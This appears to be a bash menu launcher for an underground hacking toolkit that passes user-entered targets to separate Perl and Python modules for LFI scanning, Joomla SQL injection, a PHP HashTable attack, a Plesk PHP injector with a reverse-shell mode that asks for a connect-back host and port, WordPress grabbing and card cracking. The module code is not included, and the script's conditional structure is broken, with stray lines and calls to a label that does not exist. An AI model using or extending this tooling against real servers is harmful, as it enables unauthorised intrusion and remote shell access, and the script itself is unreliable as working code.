#! /bin/bash
# Demo video : https://www.youtube.com/watch?v=nWdm16c9aKE
# [Priv8] R00tw0rm React0r TooL v1.0 
#Fuck your Right .. Sys
function jumpto
{
    label=$1
    cmd=$(sed -n "/$label:/{:a;n;p;ba};" $0 | grep -v ':$')
    eval "$cmd"
    exit
}

cat <<"EOT"
#-------------------------------------|------------------------------------------#
#        _______  _______   __          _______                 
#_______ \   _  \ \   _  \_/  |___  _  _\   _  \_______  _____  
#\_  __ \/  /_\  \/  /_\  \   __\ \/ \/ /  /_\  \_  __ \/     \ 
# |  | \/\  \_/   \  \_/   \  |  \     /\  \_/   \  | \/  Y Y  \
# |__|    \_____  /\_____  /__|   \/\_/  \_____  /__|  |__|_|  /
#               \/       \/                    \/            \/
#
#
# This was written for educational purposes only. 
# Use it at your own risk. Author will be not responsible for any damage!
# Coder      : kyxrec0n
# Description: [Priv8] R00tw0rm React0r TooL v1.0 
# For r00tw0rm members only! No Leechers!!
#-------------------------------------|------------------------------------------#
		
EOT
#Menu
echo -e "\e[1;33m=============================================="
echo "|Chose Type Of Hacking :                     |"
echo "|(1) Priv8 GET Location                      |"
echo "|(2) LFI Scann3r                             |"
echo "|(3) Joomla Component com_jumi SQL           |"
echo "|(4) Wpscanner@WordPress Users Scanner       |"
echo "|(5) Priv8Scan Framew0rk                     |"
echo "|(6) Apache Vuln Scann3r                     |"
echo "|(7) PHP HashTable Exploit3r                 |"
echo "|(8) Plesk PHP Inject0r                      |"
echo "|(9) Priv8 advance crawl ip & domain's tool  |"
echo "|(10) Priv8 scann3r websties & servers       |"
echo "|(11) Priv8 extractor subdomains from google |"
echo "|(12) Priv8 Wordpress Grabber v0.2           |"
echo "|(13) Litte RWtools - T00lZ v1.0             |"
echo "|(99) exit ..                                |"
echo "=============================================="
echo "Rw00~\$:"
read type
if [ $type -eq 1 ]; then

echo " Input Target IP : "
read target
cat <<"EOT"

EOT
perl Module1.pl $target

else
     
##########################################
if [ $type -eq 2 ]; then

perl Module2.pl
##########################################
else

if [ $type -eq 3 ]; then

perl Module3.pl

else

##########################################
if [ $type -eq 4 ]; then

echo " Input Target IP : "
read target

python Module16.py -s $target -n 50

else

##########################################

if [ $type -eq 5 ]; then

python Module5.py 
  
     .

else

##########################################
if [ $type -eq 6 ]; then
python Module6.py -h
##########################################
else
if [ $type -eq 7 ]; then
echo " Input Host : "
read host
echo " Verbose Output : "
read verb
echo "Requests Number : "
read rq
echo " Target To Attack (PHP/JAVA/ASP) : "
read tat
python Module7.py -u $host -v $verb -c $rq -t $tat
  .
##########################################
else
if [ $type -eq 8 ]; then
echo " Input Target PLSK : "
read plsk
echo " Choose Mode (RSH (reverse shell), UP (upload) or SH (inline shell))  "
read modd
echo " Choose File to Upload ( full path ) : "
read uploadfile
echo "Where to put the file on the server (full path) : "
read putfiles
echo "Host to connect back to : "
read backconnect
echo "Port to connect back to : "
read portconnect
echo "Reverse Shell Type - Python or Perl : "
read rvshellz
python Module8.py --target $plsk --mode $modd --lfile $uploadfile --rfile $putfiles --lhost $backconnect --lport $portconnect --stype $rvshellz
   .
##########################################
else

if [ $type -eq 9 ]; then

python Module9.py
##########################################
else

if [ $type -eq 10 ]; then

echo " Input Target IP : "
read target

python Module18.py $target

##########################################
else
if [ $type -eq 11 ]; then
echo " Input Target IP : "

read target
###BannerE0t
cat <<"EOT"

  I%sIIII. I  II  .    II..IIIIIIIIIIIIIIIIIIII
 .  .IIIIII  II             IIIIII%sIIIII  I.
    .IIIII.III I        IIIIIIIIIIIIIIIIIIIIIII
   .II%sII           II  .IIIII IIIIIIIIIIII. I
    IIIIII             IIII I  II%sIIIIIII I
    .II               IIIIIIIIIIIII  IIIIIIIII
       I.           .III%sIIII    I   II  I
         .IIII        IIIIIIIIIIII     .       I
          IIIII.          IIIIII           . I.
          II%sIII         IIIII             ..I  II .
           IIIIII          IIII...             IIII
            IIII           III. I            II%sII
            III             I                I  III
            II                                   I   .
             I

      This was written for educational purposes only.
     Description: [Priv8] R00tw0rm Subdomain extract0r v1.0 
    (c) R00tw0rm ~ For r00tw0rm members only! No Leechers!! 	

[*] Launching search ....
[!] Wait for the rersults.....
	
EOT
sleep 0.5
python Module11.py $target

##########################################
else
if [ $type -eq 12 ]; then
echo " Input Target IP : "
read target
echo -e "\033[1;31m"
python Module12.py $target
##########################################
else
if [ $type -eq 13 ]; then
echo "============================"
echo "|1- Pr0 SMTP SenD3r v1.0   |"
echo "|2- Poodlebleed Mass Sc3nr |"
echo "|3- PHP Payloadgenerator   |"
echo "|4- Web Attack3r v1.0      |"
echo "|5- GTH locat0r            |"
echo "|6- CaRdcrack v2.0         |"
echo "|00- Turn Back             |"
echo "============================"
echo "DRS~$:"
read menu

if [ $menu -eq 1 ]; then

python Module13.py

##########################################
if [ $menu -eq 2 ]; then

python Module14.py

##########################################
else
if [ $menu -eq 3 ]; then

python Module15.py

##########################################
else
if [ $menu -eq 00 ]; then

jumpto $start

##########################################

else
if [$menu -eq 14 ]; then
echo " Coming Soon..."

##########################################
    elif [ $type -eq 00 ]; then
	echo "--------------------------"
    echo "-Now you are Leaving      -"
	echo "--------------------------"
     exit
     .
else 
    echo "You made an error ..."
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
